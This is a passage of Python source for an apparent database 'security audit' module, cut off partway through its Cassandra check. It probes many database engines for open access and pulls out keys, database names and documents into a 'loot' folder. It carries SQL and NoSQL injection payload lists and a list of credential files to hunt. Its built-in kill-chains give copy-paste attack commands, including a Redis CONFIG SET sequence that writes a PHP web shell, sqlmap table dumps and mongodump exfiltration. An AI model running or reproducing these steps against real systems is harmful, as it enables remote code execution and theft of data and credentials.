"""
db_security — dedicated database security audit (the 'db_scan' profile).

A single module that, in order: scans default DB ports and fingerprints the engine from the
banner; tests for unauthenticated access (Redis, Memcached, Elasticsearch, CouchDB, MongoDB)
and default credentials (where a driver is available); probes crawled parameters for SQL and
NoSQL injection; hunts exposed DB admin interfaces, dump/backup files, and framework debug
leaks; checks TLS on DB ports; and finally computes a DB Exposure Score (0-100) with a grade.

Every check is wrapped so one failure never crashes the audit. Safe mode skips the
destructive checks (default creds, time-based SQLi, NoSQL) and limits the port scan.
"""
from __future__ import annotations

import json
import re
import socket
import ssl
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from urllib.parse import urlparse

import httpx
from loguru import logger

from config import PROJECT_ROOT
from scanner import evidence as ev
from scanner.engine import Finding, Severity, ScanEngine
from scanner.severity import CONSOLE_STYLE as _SEV_COLOR
from scanner.severity import severity_rank
from scanner.recon.port_scan import _is_accept_all, _probe_port, _resolve  # reuse connect/banner/accept-all
from scanner.vulns._common import Injector, get, inject_param, is_safe_mode, iter_injectors

MODULE = "db_security"

# port → engine label
_DB_PORTS: dict[int, str] = {
    3306: "MySQL/MariaDB", 5432: "PostgreSQL", 1433: "MSSQL", 1521: "Oracle",
    27017: "MongoDB", 6379: "Redis", 9200: "Elasticsearch", 9300: "Elasticsearch",
    5984: "CouchDB", 9042: "Cassandra", 11211: "Memcached",
    # Expanded coverage — modern data stores frequently exposed without auth.
    8123: "ClickHouse", 9000: "ClickHouse", 2379: "etcd", 8086: "InfluxDB",
    7474: "Neo4j", 7687: "Neo4j", 2181: "Zookeeper", 26257: "CockroachDB",
    28015: "RethinkDB", 8529: "ArangoDB",
}
_SAFE_PORTS = (3306, 5432, 1433, 27017, 6379)

# Exposure-score weights (counted once per category that fired).
_SCORE = {"unauth": 30, "cloud_db": 30, "cred_reuse": 30, "sqli": 25, "authbypass": 25,
          "default_creds": 20, "creds_leak": 20, "cve": 20, "admin_200": 15,
          "dump": 10, "nosql": 10, "graphql": 10, "tls": 5, "admin_403": 5}

# MITRE ATT&CK technique per finding category (red-team reporting).
_ATTACK = {
    "unauth": "T1190 Exploit Public-Facing Application",
    "cloud_db": "T1530 Data from Cloud Storage",
    "sqli": "T1190 Exploit Public-Facing Application",
    "authbypass": "T1212 Exploitation for Credential Access",
    "nosql": "T1190 Exploit Public-Facing Application",
    "graphql": "T1213 Data from Information Repositories",
    "creds_leak": "T1552.001 Credentials in Files",
    "default_creds": "T1078.001 Default Accounts",
    "cred_reuse": "T1078 Valid Accounts",
    "cve": "T1190 Exploit Public-Facing Application",
    "dump": "T1213 Data from Information Repositories",
    "admin_200": "T1190 Exploit Public-Facing Application",
    "admin_403": "T1087 Account Discovery",
    "extraction": "T1213 Data from Information Repositories",
}

# Headers an attacker can smuggle injection through (server often logs/queries these).
_INJECT_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP"]

# Cloud / managed database fingerprints found in page/JS source.
_FIREBASE_RE = re.compile(r"https?://([a-z0-9-]+)\.firebaseio\.com", re.I)
_FIREBASE_CFG_RE = re.compile(r"['\"]databaseURL['\"]\s*:\s*['\"]https?://([a-z0-9-]+)\.firebaseio\.com", re.I)
_SUPABASE_RE = re.compile(r"https?://([a-z0-9]+)\.supabase\.co", re.I)
_SUPABASE_KEY_RE = re.compile(r"(eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,})")
_FIRESTORE_RE = re.compile(r"firestore\.googleapis\.com/v1/projects/([a-z0-9-]+)", re.I)

# ---------------------------------------------------------------------------
# SQL injection payloads & error signatures
# ---------------------------------------------------------------------------

_ERR_PAYLOADS = ["'", "''", "`", "')", "'))", "1' OR '1'='1", "1' OR '1'='2"]
_BOOL_PAYLOADS = [("1 AND 1=1", "1 AND 1=2")]
_TIME_PAYLOADS = [
    ("MSSQL", "1; WAITFOR DELAY '0:0:{t}'--"),
    ("MySQL", "1 AND SLEEP({t})--"),
    ("PostgreSQL", "1; SELECT pg_sleep({t})--"),
]
_SQL_ERRORS: list[tuple[re.Pattern[str], str]] = [(re.compile(p, re.I), e) for p, e in [
    (r"you have an error in your sql syntax|mysql_fetch|mysql server version", "MySQL"),
    (r"pg_query\(\)|psqlexception|unterminated quoted", "PostgreSQL"),
    (r"unclosed quotation mark|ole db|sqlexception", "MSSQL"),
    (r"ora-\d{4,5}|oracle error|quoted string not properly ended", "Oracle"),
    (r"sqlite3::|sqlite_error|unrecognized token", "SQLite"),
    (r"odbc driver|database error|sql syntax", "Generic SQL"),
]]

_NOSQL_PAYLOADS = ['{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}', '{"$regex": ".*"}']

_ADMIN_PATHS = [
    "/phpmyadmin", "/phpmyadmin/", "/pma", "/PMA", "/phpMyAdmin", "/mysql", "/myadmin",
    "/adminer.php", "/adminer", "/adminer/", "/pgadmin", "/pgadmin4", "/phppgadmin",
    "/mongodb", "/mongo-express", "/mongoui", "/rockmongo", "/_utils", "/_utils/",
    "/redis-commander", "/redisinsight", "/redisadmin",
    "/elasticsearch-head", "/_plugin/head/", "/kibana", "/app/kibana", "/grafana",
    "/pgweb", "/sqlpad", "/cloudbeaver", "/dbgate",
    "/db", "/database", "/dbadmin", "/sqladmin", "/sql",
]
_ADMIN_SIG = re.compile(r"phpmyadmin|adminer|pgadmin|phppgadmin|mongo.?express|rockmongo|"
                        r"redis.?commander|redisinsight|kibana|grafana|elasticsearch|"
                        r"fauxton|sqlpad|cloudbeaver|dbgate|pgweb", re.I)

_DUMP_PATHS = [
    "/backup.sql", "/dump.sql", "/database.sql", "/db.sql",
    "/backup.sql.gz", "/dump.sql.gz", "/database.sql.gz",
    "/site.sql", "/wordpress.sql", "/backup.db",
    "/data/dump.sql", "/backups/db.sql", "/sql/backup.sql",
]

_FRAMEWORK_PATHS = [
    ("/actuator/env", "Spring Actuator"), ("/actuator/configprops", "Spring Actuator"),
    ("/rails/info/properties", "Rails"),
]
_DB_CRED_RE = re.compile(r"DB_PASSWORD|DB_HOST|DB_USERNAME|database_password|"
                         r"spring\.datasource|connectionstring", re.I)

# Hardcoded DB connection strings / credentials leaked in page or inline JS.
_CONNSTR_RE = re.compile(
    r"(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|mariadb|redis|amqp|mssql|sqlserver)://[^\s\"'<>`]{6,150}"
    r"|jdbc:[a-z0-9]+://[^\s\"'<>`]{6,150}"
    r"|Data Source=[^;\"'<>]+;[^\"'<>]{0,120}?Password=[^;\"'<>]+", re.I)

# GraphQL endpoints to probe for introspection.
_GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/v1/graphql", "/graphql/console",
                  "/graphiql", "/v2/graphql", "/query"]

# Extra database file types to hunt (SQLite, Access, more dumps).
_EXTRA_DUMP_PATHS = [
    "/database.sqlite", "/database.sqlite3", "/db.sqlite3", "/app.db", "/data.db",
    "/database.db", "/database.mdb", "/db.mdb",
    "/mysql.sql", "/db_backup.sql", "/dump/db.sql", "/sql/dump.sql",
    "/backup/database.sql", "/backup.sql.zip", "/database.sql.zip", "/dump.tar.gz",
]
_SQLITE_MAGIC = b"SQLite format 3"

# DB credential / config files to hunt (server-side secrets that leak DB access).
_SECRET_FILES = [
    "/.env", "/.env.local", "/.env.production", "/.env.dev", "/.env.backup", "/.env.bak",
    "/config/database.yml", "/config/database.php", "/config/database.json",
    "/config.php", "/configuration.php", "/wp-config.php", "/wp-config.php.bak",
    "/database.yml", "/settings.py", "/local_settings.py", "/config.json",
    "/application.properties", "/application.yml", "/appsettings.json",
    "/ormconfig.json", "/knexfile.js", "/sequelize.json", "/prisma/.env",
    "/.pgpass", "/my.cnf", "/.my.cnf", "/mysql.cnf",
    "/docker-compose.yml", "/docker-compose.yaml",
    "/credentials.json", "/secrets.json", "/db.json",
]
# Tokens that prove DB credentials live inside a leaked config file.
_SECRET_CRED_RE = re.compile(
    r"(DB_PASSWORD|DB_USERNAME|DB_USER|DB_HOST|DB_DATABASE|DB_CONNECTION|"
    r"MYSQL_(?:ROOT_)?PASSWORD|POSTGRES_PASSWORD|MONGO_INITDB_ROOT_PASSWORD|"
    r"database_password|spring\.datasource|jdbc:|PGPASSWORD|"
    r"password\s*[:=]|passwd\s*=)", re.I)


# ---------------------------------------------------------------------------
# Finding factory
# ---------------------------------------------------------------------------

def _f(title, desc, sev, rec, category, **raw) -> Finding:
    raw["db_category"] = category
    raw.setdefault("confidence", "high")
    if category in _ATTACK:
        raw.setdefault("attack", _ATTACK[category])
    return Finding(module=MODULE, title=title, description=desc, severity=sev,
                   recommendation=rec, raw=raw)


# ---------------------------------------------------------------------------
# Exploitation kill-chains (ordered copy-paste steps per category) — rendered in
# the DB panel / HTML / attack path, and serialised in raw["exploitation"].
# ---------------------------------------------------------------------------

def _step(n: int, description: str, command: str) -> dict:
    return {"step": n, "description": description, "command": command}


def _db_exploitation(category: str, **ctx) -> list[dict]:
    """Return an ordered red-team kill-chain for a confirmed DB finding (authorised targets only)."""
    host, port = ctx.get("host", "<host>"), ctx.get("port", "")
    if category == "redis_unauth":
        cli = f"redis-cli -h {host} -p {port}"
        return [_step(1, "Connect to the open Redis instance (no auth).", cli),
                _step(2, "List and read keys to confirm data access.", f"{cli} KEYS '*'   # then: {cli} GET <key>"),
                _step(3, "Escalate to RCE — rewrite the RDB path to drop a web shell / SSH key.",
                      f"{cli} CONFIG SET dir /var/www/html; {cli} CONFIG SET dbfilename shell.php; "
                      f"{cli} SET x '<?php system($_GET[0]);?>'; {cli} SAVE")]
    if category == "mongo_unauth":
        db = ctx.get("db", "admin")
        uri = f"mongodb://{host}:{port}"
        return [_step(1, "Connect to the open MongoDB instance (no auth).", f"mongosh '{uri}'"),
                _step(2, "Enumerate databases and collections.",
                      f"mongosh '{uri}' --eval 'db.adminCommand({{listDatabases:1}})'"),
                _step(3, "Dump a database to disk.", f"mongodump --uri '{uri}/{db}' -o loot_mongo")]
    if category == "es_unauth":
        url = ctx.get("url", f"http://{host}:{port}")
        return [_step(1, "Confirm the open cluster and list indices.", f"curl '{url}/_cat/indices?v'"),
                _step(2, "Dump documents from every index.", f"curl '{url}/_search?size=100&pretty'")]
    if category == "couch_unauth":
        url = ctx.get("url", f"http://{host}:{port}")
        return [_step(1, "List all databases.", f"curl '{url}/_all_dbs'"),
                _step(2, "Dump every document of a database.", f"curl '{url}/<db>/_all_docs?include_docs=true'")]
    if category == "http_db_unauth":
        return [_step(1, ctx.get("desc", "Query the open database over HTTP (no auth)."), ctx.get("cmd", ""))]
    if category == "sqli":
        url, param = ctx.get("url", "<url>"), ctx.get("param", "id")
        base = f'sqlmap -u "{url}" -p {param} --batch --technique={ctx.get("flag", "BEUSTQ")}'
        return [_step(1, "Confirm the injection and list the databases.", f"{base} --dbs"),
                _step(2, "Enumerate the tables of the target database.", f"{base} -D <db> --tables"),
                _step(3, "Dump credentials/data from a table.", f"{base} -D <db> -T <table> --dump")]
    if category in ("cloud_db", "creds_leak", "dump", "admin"):
        steps = [_step(1, ctx.get("desc", "Access the exposed resource."), ctx.get("cmd", ""))]
        if ctx.get("connect"):
            steps.append(_step(2, "Connect directly to the database with the harvested credentials.",
                               ctx["connect"]))
        return steps
    if ctx.get("cmd"):
        return [_step(1, ctx.get("desc", "Exploit the finding."), ctx["cmd"])]
    return []


# ---------------------------------------------------------------------------
# BSON / MongoDB wire-protocol helpers (OP_MSG for modern Mongo ≥3.6/5.1)
# ---------------------------------------------------------------------------

def _bson_doc(elements: bytes) -> bytes:
    return (len(elements) + 5).to_bytes(4, "little") + elements + b"\x00"


def _bson_int32(name: str, val: int) -> bytes:
    return b"\x10" + name.encode() + b"\x00" + val.to_bytes(4, "little", signed=True)


def _bson_str(name: str, val: str) -> bytes:
    vb = val.encode() + b"\x00"
    return b"\x02" + name.encode() + b"\x00" + len(vb).to_bytes(4, "little") + vb


def _op_msg(cmd_bson: bytes) -> bytes:
    """Wrap a BSON command document in a MongoDB OP_MSG (opcode 2013)."""
    body = (0).to_bytes(4, "little") + b"\x00" + cmd_bson          # flagBits=0, section kind 0
    return ((16 + len(body)).to_bytes(4, "little") + (3).to_bytes(4, "little")
            + (0).to_bytes(4, "little") + (2013).to_bytes(4, "little") + body)


# ---------------------------------------------------------------------------
# Evidence on disk (red-team loot) — only written in active (--exploit) mode
# ---------------------------------------------------------------------------

def _loot_dir(engine: ScanEngine) -> Path:
    """Create and return loot/<host>_<timestamp>/ for extracted evidence (gitignored)."""
    host = urlparse(engine.url).hostname or "target"
    safe_host = re.sub(r"[^A-Za-z0-9_.-]", "_", host)
    d = PROJECT_ROOT / "loot" / f"{safe_host}_{time.strftime('%Y%m%d_%H%M%S')}"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _save_evidence(loot: Path | None, name: str, data: "str | bytes") -> str:
    """Write *data* to loot/<name>, returning the path (or '' if no loot dir)."""
    if loot is None:
        return ""
    safe = re.sub(r"[^A-Za-z0-9_.-]", "_", name)[:80]
    path = loot / safe
    try:
        mode, payload = ("wb", data) if isinstance(data, bytes) else ("w", data)
        with open(path, mode, encoding=None if "b" in mode else "utf-8") as fh:
            fh.write(payload)
        return str(path)
    except OSError as exc:  # noqa: BLE001
        logger.debug(f"db_security: could not write evidence {name}: {exc}")
        return ""


# ---------------------------------------------------------------------------
# Raw TCP helper (mockable in tests)
# ---------------------------------------------------------------------------

def _tcp_send_recv(host: str, port: int, payload: bytes, timeout: float = 3.0,
                   read: int = 4096) -> bytes:
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            if payload:
                sock.sendall(payload)
            data = b""
            try:
                while len(data) < read:
                    chunk = sock.recv(read)
                    if not chunk:
                        break
                    data += chunk
            except socket.timeout:
                pass
            return data
    except OSError as exc:
        logger.debug(f"db_security: TCP {host}:{port} → {exc}")
        return b""


# ---------------------------------------------------------------------------
# Exposure detection
# ---------------------------------------------------------------------------

@dataclass
class _OpenPort:
    port: int
    engine: str
    banner: str
    version: str = ""


def _fingerprint_version(banner: str) -> str:
    m = re.search(r"(\d+\.\d+(?:\.\d+)?)", banner)
    return m.group(1) if m else ""


def _scan_ports(ip: str, safe: bool, workers: int) -> list[_OpenPort]:
    ports = list(_SAFE_PORTS if safe else _DB_PORTS.keys())
    found: list[_OpenPort] = []
    with ThreadPoolExecutor(max_workers=max(workers, len(ports))) as pool:
        futures = {pool.submit(_probe_port, ip, p): p for p in ports}
        for fut in as_completed(futures):
            port = futures[fut]
            try:
                is_open, banner = fut.result()
            except Exception:  # noqa: BLE001
                continue
            if is_open:
                found.append(_OpenPort(port, _DB_PORTS.get(port, "Unknown"),
                                       banner, _fingerprint_version(banner)))
    return sorted(found, key=lambda o: o.port)


# ---------------------------------------------------------------------------
# Unauthenticated-access checks
# ---------------------------------------------------------------------------

def _unauth_finding(engine_name: str, host: str, port: int, detail: str) -> Finding:
    return _f(f"Unauthenticated {engine_name} Access: {host}:{port}",
              f"{engine_name} on {host}:{port} is reachable WITHOUT authentication ({detail}). "
              "Anyone on the internet can read or modify the data.",
              Severity.CRITICAL,
              f"Enable authentication on {engine_name}, bind it to localhost/VPN, and firewall the port.",
              "unauth", host=host, port=port, engine=engine_name)


def _check_redis(host: str, port: int) -> list[Finding]:
    resp = _tcp_send_recv(host, port, b"PING\r\n")
    if b"+PONG" not in resp:
        if b"NOAUTH" in resp or b"-ERR" in resp.upper():
            return [_f(f"Redis Requires Authentication: {host}:{port}",
                       f"Redis on {host}:{port} demands AUTH (good), but the port is publicly reachable.",
                       Severity.LOW, "Keep auth on and firewall the port.", "tls",
                       host=host, port=port, engine="Redis")]
        return []

    # Unauthenticated — extract proof-of-data (the exploitation step).
    info = _tcp_send_recv(host, port, b"INFO server\r\n")
    ver = _extract(info, rb"redis_version:([0-9.]+)")
    nkeys = _extract(_tcp_send_recv(host, port, b"DBSIZE\r\n"), rb":(\d+)")
    keys_raw = _tcp_send_recv(host, port, b"KEYS *\r\n")
    sample_keys = [k.decode("latin-1", "replace") for k in re.findall(rb"\r\n([^\r\n$*:+-][^\r\n]*)", keys_raw)][:8]

    fnd = _unauth_finding("Redis", host, port,
                          f"PING/INFO without AUTH" + (f", v{ver}" if ver else "")
                          + (f", {nkeys} keys" if nkeys else ""))
    fnd.raw.update(keys_count=nkeys, sample_keys=sample_keys,
                   exploit_cmd=f"redis-cli -h {host} -p {port}   # then: KEYS *  /  GET <key>  /  CONFIG GET *",
                   evidence=ev.from_parts("TCP", f"{host}:{port}", "PING/INFO/KEYS",
                                          indicator="+PONG returned without AUTH"
                                          + (f", {nkeys} keys" if nkeys else "")
                                          + (f", v{ver}" if ver else ""))
                   + ([f"sample keys: {', '.join(sample_keys[:6])}"] if sample_keys else []),
                   exploitation=_db_exploitation("redis_unauth", host=host, port=port))
    if sample_keys:
        fnd.description += " Sample keys: " + ", ".join(sample_keys[:6]) + "."
    out = [fnd]

    # CONFIG reachable → write-to-disk → RCE (webshell / SSH key / cron).
    cfg = _tcp_send_recv(host, port, b"CONFIG GET dir\r\n")
    if b"dir" in cfg and b"unknown command" not in cfg.lower() and b"-NOPERM" not in cfg.upper():
        out.append(_f(f"Redis CONFIG Reachable — Remote Code Execution: {host}:{port}",
                      f"Unauthenticated Redis on {host}:{port} exposes CONFIG GET/SET. An attacker can "
                      "rewrite 'dir'/'dbfilename' to drop a web shell, SSH key, or cron job — full RCE.",
                      Severity.CRITICAL,
                      "Require AUTH, run 'rename-command CONFIG \"\"', enable protected-mode, firewall the port.",
                      "unauth", host=host, port=port, engine="Redis",
                      exploit_cmd="See redis RCE via CONFIG SET dir + SAVE (write webshell/SSH key)."))
    return out


def _check_memcached(host: str, port: int) -> list[Finding]:
    resp = _tcp_send_recv(host, port, b"stats\r\n")
    if b"STAT " in resp or b"pid" in resp:
        return [_unauth_finding("Memcached", host, port, "'stats' returned data without auth")]
    return []


def _extract(data: bytes, pattern: bytes) -> str:
    m = re.search(pattern, data)
    return m.group(1).decode("latin-1", "replace") if m else ""


def _op_query_listdatabases() -> bytes:
    """Legacy OP_QUERY (opcode 2004) listDatabases on admin.$cmd — for Mongo < 3.6 only."""
    doc = b"\x10listDatabases\x00\x01\x00\x00\x00"          # int32 field "listDatabases"=1
    bson = (len(doc) + 5).to_bytes(4, "little") + doc + b"\x00"
    body = (b"\x00\x00\x00\x00" + b"admin.$cmd\x00"
            + (0).to_bytes(4, "little") + (1).to_bytes(4, "little") + bson)
    return ((16 + len(body)).to_bytes(4, "little") + (1).to_bytes(4, "little")
            + b"\x00\x00\x00\x00" + (2004).to_bytes(4, "little") + body)


def _mongo_databases(resp: bytes) -> list[str]:
    """Extract database names from a listDatabases reply (BSON string elements named 'name')."""
    return [m.decode("latin-1", "replace")
            for m in re.findall(rb"\x02name\x00.{4}([ -~]{1,64}?)\x00", resp)][:20]


def _check_mongodb(host: str, port: int) -> list[Finding]:
    """Unauthenticated MongoDB via modern OP_MSG (2013) listDatabases; OP_QUERY fallback for old Mongo."""
    cmd = _bson_doc(_bson_int32("listDatabases", 1) + _bson_str("$db", "admin"))
    resp = _tcp_send_recv(host, port, _op_msg(cmd), read=8192)
    proto = "OP_MSG"
    if not (b"databases" in resp and b"sizeOnDisk" in resp):
        resp = _tcp_send_recv(host, port, _op_query_listdatabases(), read=4096)   # legacy fallback
        proto = "OP_QUERY"
    if b"not authorized" in resp or b"requires authentication" in resp.lower():
        return []
    if not (b"databases" in resp and b"sizeOnDisk" in resp):
        return []
    dbs = _mongo_databases(resp)
    f = _unauth_finding("MongoDB", host, port,
                        f"listDatabases succeeded without auth ({proto})"
                        + (f", {len(dbs)} database(s)" if dbs else ""))
    f.raw.update(
        databases=dbs, mongo_dbs=dbs,
        evidence=ev.from_parts("TCP", f"{host}:{port}", f"{proto} listDatabases",
                               indicator="server returned the database list with no authentication")
        + ([f"databases: {', '.join(dbs[:8])}"] if dbs else []),
        exploitation=_db_exploitation("mongo_unauth", host=host, port=port,
                                      db=dbs[0] if dbs else "admin"),
        exploit_cmd=f"mongosh 'mongodb://{host}:{port}'   # then: show dbs / use <db> / db.<coll>.find()")
    if dbs:
        f.description += " Databases: " + ", ".join(dbs[:10]) + "."
    return [f]


def _check_elasticsearch(engine: ScanEngine, host: str, port: int) -> list[Finding]:
    """Unauthenticated Elasticsearch → list indices and document counts (data exposure)."""
    for scheme in ("http", "https"):
        try:
            root = engine.request("GET", f"{scheme}://{host}:{port}/", timeout=6.0)
        except httpx.HTTPError:
            continue
        if root.status_code in (401, 403):
            return []
        if root.status_code == 200 and ('"cluster_name"' in root.text or '"lucene_version"' in root.text):
            indices, docs = [], 0
            try:
                idx = engine.request("GET", f"{scheme}://{host}:{port}/_cat/indices?format=json", timeout=6.0)
                for i in (idx.json() if idx.status_code == 200 else []):
                    if isinstance(i, dict):
                        indices.append(i.get("index", "?"))
                        docs += int(i.get("docs.count", 0) or 0)
            except Exception:  # noqa: BLE001
                pass
            f = _unauth_finding("Elasticsearch", host, port,
                                f"open cluster, {len(indices)} index(es), ~{docs} documents")
            f.raw.update(indices=indices[:15], doc_count=docs,
                         exploit_cmd=f"curl '{scheme}://{host}:{port}/_search?size=20&pretty'",
                         evidence=ev.from_response(root,
                                                   indicator=f"open cluster, {len(indices)} index(es), ~{docs} docs"),
                         exploitation=_db_exploitation("es_unauth", host=host, port=port,
                                                       url=f"{scheme}://{host}:{port}"))
            if indices:
                f.description += " Indices: " + ", ".join(indices[:10]) + "."
            return [f]
    return []


def _check_couchdb(engine: ScanEngine, host: str, port: int) -> list[Finding]:
    for scheme in ("http", "https"):
        try:
            r = engine.request("GET", f"{scheme}://{host}:{port}/_all_dbs", timeout=6.0)
        except httpx.HTTPError:
            continue
        if r.status_code in (401, 403):
            return []
        if r.status_code == 200 and r.text.strip().startswith("["):
            try:
                dbs = [d for d in r.json() if isinstance(d, str)]
            except Exception:  # noqa: BLE001
                dbs = []
            f = _unauth_finding("CouchDB", host, port, f"_all_dbs returned {len(dbs)} database(s)")
            f.raw.update(databases=dbs[:20],
                         exploit_cmd=f"curl '{scheme}://{host}:{port}/_all_dbs' then /<db>/_all_docs",
                         evidence=ev.from_response(r,
                                                   indicator=f"_all_dbs returned {len(dbs)} database(s) without auth"),
                         exploitation=_db_exploitation("couch_unauth", host=host, port=port,
                                                       url=f"{scheme}://{host}:{port}"))
            if dbs:
                f.description += " Databases: " + ", ".join(dbs[:10]) + "."
            return [f]
    return []


# ---------------------------------------------------------------------------
# Expanded engine coverage: ClickHouse / etcd / InfluxDB / Neo4j / Zookeeper / Cassandra
# ---------------------------------------------------------------------------

def _http_db_get(engine: ScanEngine, host: str, port: int, path: str
                 ) -> "tuple[str, httpx.Response] | tuple[None, None]":
    for scheme in ("http", "https"):
        try:
            return scheme, engine.request("GET", f"{scheme}://{host}:{port}{path}", timeout=6.0)
        except httpx.HTTPError:
            continue
    return None, None


def _check_clickhouse(engine: ScanEngine, host: str, port: int) -> list[Finding]:
    """ClickHouse HTTP interface (8123): default user, no password → SQL over HTTP without auth."""
    scheme, r = _http_db_get(engine, host, port, "/?query=SHOW%20DATABASES")
    if r is None or r.status_code in (401, 403):
        return []
    is_ch = any(h.lower().startswith("x-clickhouse") for h in r.headers) or "system" in r.text.lower()
    if r.status_code != 200 or not is_ch or "<html" in r.text[:200].lower():
        return []
    dbs = [d.strip() for d in r.text.splitlines() if d.strip()][:20]
    url = f"{scheme}://{host}:{port}"
    f = _unauth_finding("ClickHouse", host, port,
                        f"SHOW DATABASES returned {len(dbs)} database(s) over HTTP without auth")
    f.raw.update(
        databases=dbs,
        evidence=ev.from_response(r, indicator="ClickHouse answered SQL over HTTP with no credentials"),
        exploitation=_db_exploitation("http_db_unauth", host=host, port=port,
                                      desc="Dump rows from any table over the ClickHouse HTTP interface.",
                                      cmd=f"curl '{url}/?query=SELECT%20*%20FROM%20<db>.<table>%20LIMIT%2050'"),
        exploit_cmd=f"curl '{url}/?query=SHOW%20TABLES%20FROM%20<db>'")
    if dbs:
        f.description += " Databases: " + ", ".join(dbs[:10]) + "."
    return [f]


def _check_etcd(engine: ScanEngine, host: str, port: int) -> list[Finding]:
    """etcd (2379): /version confirms the engine; an unauthenticated key read proves full exposure."""
    scheme, ver = _http_db_get(engine, host, port, "/version")
    if ver is None or "etcdserver" not in ver.text.lower():
        return []
    url = f"{scheme}://{host}:{port}"
    _, keys = _http_db_get(engine, host, port, "/v2/keys/?recursive=true")
    unauth = keys is not None and keys.status_code == 200 and '"nodes"' in keys.text
    if unauth:
        f = _unauth_finding("etcd", host, port, "/v2/keys returned the keyspace without auth")
        f.raw.update(
            evidence=ev.from_response(keys, indicator="etcd served its key/value store with no authentication"),
            exploitation=_db_exploitation("http_db_unauth", host=host, port=port,
                                          desc="Dump the entire etcd keyspace (often holds Kubernetes secrets).",
                                          cmd=f"curl '{url}/v2/keys/?recursive=true' ; "
                                          f"curl -X POST '{url}/v3/kv/range' -d '{{\"key\":\"AA==\",\"range_end\":\"AA==\"}}'"),
            exploit_cmd=f"curl '{url}/v2/keys/?recursive=true'")
        return [f]
    return [_f(f"etcd Exposed (auth may be enabled): {host}:{port}",
               f"etcd is reachable at {url} (version endpoint responded). If RBAC is off, the whole "
               "keyspace — frequently Kubernetes secrets — is readable.",
               Severity.HIGH, "Enable etcd client auth + TLS and firewall ports 2379/2380.",
               "admin_403", host=host, port=port, engine="etcd", url=url,
               evidence=ev.from_response(ver, indicator="etcd /version responded"),
               exploit_cmd=f"curl '{url}/v2/keys/?recursive=true'")]


def _check_influxdb(engine: ScanEngine, host: str, port: int) -> list[Finding]:
    """InfluxDB 1.x (8086): /ping header confirms it; SHOW DATABASES without auth = open."""
    scheme, ping = _http_db_get(engine, host, port, "/ping")
    if ping is None or not any(h.lower() == "x-influxdb-version" for h in (ping.headers or {})):
        return []
    _, q = _http_db_get(engine, host, port, "/query?q=SHOW+DATABASES")
    if q is None or q.status_code in (401, 403) or q.status_code != 200 or '"series"' not in q.text:
        return []
    url = f"{scheme}://{host}:{port}"
    dbs = re.findall(r'"values":\[\["([^"]+)"', q.text)[:20]
    f = _unauth_finding("InfluxDB", host, port,
                        f"SHOW DATABASES returned {len(dbs)} database(s) without auth")
    f.raw.update(
        databases=dbs,
        evidence=ev.from_response(q, indicator="InfluxDB answered SHOW DATABASES with no credentials"),
        exploitation=_db_exploitation("http_db_unauth", host=host, port=port,
                                      desc="Read measurements/points from any database.",
                                      cmd=f"curl -G '{url}/query' --data-urlencode 'q=SELECT * FROM <measurement> LIMIT 50' --data-urlencode 'db=<db>'"),
        exploit_cmd=f"curl -G '{url}/query' --data-urlencode 'q=SHOW MEASUREMENTS' --data-urlencode 'db=<db>'")
    if dbs:
        f.description += " Databases: " + ", ".join(dbs[:10]) + "."
    return [f]


def _check_neo4j(engine: ScanEngine, host: str, port: int) -> list[Finding]:
    """Neo4j (7474): discovery API confirms the engine; flag the well-known default creds."""
    scheme, r = _http_db_get(engine, host, port, "/")
    if r is None or not ("neo4j_version" in r.text or '"bolt' in r.text.lower()):
        return []
    url = f"{scheme}://{host}:{port}"
    return [_f(f"Neo4j Exposed — Default Credentials Likely: {host}:{port}",
               f"A Neo4j database is reachable at {url}. Neo4j ships with the default login "
               "neo4j/neo4j; if it was never changed, an attacker has full graph access.",
               Severity.HIGH,
               "Change the default neo4j password, require auth, and firewall ports 7474/7687.",
               "default_creds", host=host, port=port, engine="Neo4j", url=url,
               credential="neo4j/neo4j (default — verify)", confidence="medium",
               evidence=ev.from_response(r, indicator="Neo4j discovery API responded"),
               exploitation=_db_exploitation("http_db_unauth", host=host, port=port,
                                             desc="Authenticate with the default credentials and run Cypher.",
                                             cmd=f"cypher-shell -a 'neo4j://{host}:7687' -u neo4j -p neo4j 'MATCH (n) RETURN n LIMIT 25'"))]


def _check_zookeeper(host: str, port: int) -> list[Finding]:
    """Zookeeper (2181): four-letter commands leak server config/clients without auth."""
    for cmd in (b"srvr\n", b"stat\n", b"mntr\n", b"envi\n"):
        resp = _tcp_send_recv(host, port, cmd)
        if b"Zookeeper version:" in resp or b"zk_version" in resp:
            ver = _extract(resp, rb"[Vv]ersion:\s*([0-9.]+)") or _extract(resp, rb"zk_version\s+([0-9.]+)")
            f = _unauth_finding("Zookeeper", host, port,
                                f"four-letter command {cmd.strip().decode()!r} returned data without auth"
                                + (f", v{ver}" if ver else ""))
            f.raw.update(
                version=ver,
                evidence=ev.from_parts("TCP", f"{host}:{port}", f"4lw {cmd.strip().decode()}",
                                       indicator="Zookeeper answered a four-letter command with no auth"),
                exploitation=_db_exploitation("http_db_unauth", host=host, port=port,
                                              desc="Dump server config, clients and the znode tree.",
                                              cmd=f"echo mntr | nc {host} {port} ; echo dump | nc {host} {port}"),
                exploit_cmd=f"echo stat | nc {host} {port}")
            return [f]
    return []


def _check_cassandra(host: str, port: int) -> list[Finding]:
    """Cassandra (9042): a CQL OPTIONS frame confirms the engine; STARTUP shows if auth is required."""
    # CQL v4 OPTIONS frame: version 0x04, flags 0, stream 0x0000, opcode 0x05, length 0.
    options = b"\x04\x00\x00\x00\x05\x00\x00\x00\x00"
    resp = _tcp_send_recv(host, port, options, read=2048)
    if not resp or resp[0] not in (0x84, 0x83, 0x82) or (len(resp) > 4 and resp[4] != 0x06):
        return []   # not a CQL SUPPORTED reply
    # STARTUP {"CQL_VERSION":"3.0.0"} → READY (0x02) means no auth; AUTHENTICATE (0x03) means auth on.
    body = (1).to_bytes(2, "big") + (11).to_bytes(2, "big") + b"CQL_VERSION" \
        + (5).to_bytes(2, "big") + b"3.0.0"
    startup = b"\x04\x00\x00\x00\x01" + len(body).to_bytes(4, "big") + body
